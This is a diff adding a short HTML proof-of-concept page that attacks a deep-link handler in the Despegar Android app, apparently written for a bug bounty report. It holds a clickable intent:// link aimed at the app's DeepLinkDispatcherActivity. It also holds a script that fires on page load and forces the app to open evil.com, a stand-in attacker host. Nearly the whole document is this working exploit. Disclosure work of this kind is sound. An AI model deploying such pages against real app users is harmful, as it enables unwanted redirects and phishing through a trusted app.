@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC - Deep Link Redirect</title>
+</head>
+<body>
+
+  <h2>Click below to trigger Despegar DeepLink</h2>
+
+  <!-- Method 1: Direct intent:// link -->
+  <a href="intent://bugcrowd.com#Intent;
+    scheme=https;
+    package=com.gm.despegar;
+    component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;
+    action=android.intent.action.VIEW;
+    end">
+    Tap to Trigger (Intent Link)
+  </a>
+
+  <br><br>
+
+  <!-- Method 2: Auto-trigger on page load -->
+  <script>
+    window.location = "intent://evil.com#Intent;" +
+      "scheme=https;" +
+      "package=com.gm.despegar;" +
+      "component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;" +
+      "action=android.intent.action.VIEW;" +
+      "end";
+  </script>
+
+</body>
+</html>
